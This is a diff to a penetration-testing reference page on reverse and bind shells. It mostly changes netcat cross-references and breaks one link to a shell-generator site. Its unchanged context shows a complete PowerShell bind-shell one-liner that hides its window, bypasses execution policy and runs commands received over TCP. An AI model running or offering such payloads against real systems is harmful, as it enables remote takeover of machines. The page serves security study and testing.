@@ -8,7 +8,7 @@ Status:
 Description
 ************
 
-Reverse: Shell connects back to our system (like `nc <nc>`__)
+Reverse: Shell connects back to our system (like :ref:`netcat <netcat>`)
 
 .. code-block:: console
 
@@ -20,7 +20,7 @@ webserver. Takes commands via the URL
 To generate a shell
 **********************
 
-`Reverse Shell Generator <https://www.revshells.com/>`_
+Reverse Shell Generator <https://www.revshells.com/
 
 Reverse shells on Linux/Windows
 **********************************
@@ -200,7 +200,7 @@ Code: powershell
 
    powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + " ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();
 
-Then connect to the shell with `nc <nc>`__ with:
+Then connect to the shell with :ref:`netcat <netcat>` with:
 
 .. code-block:: console
 
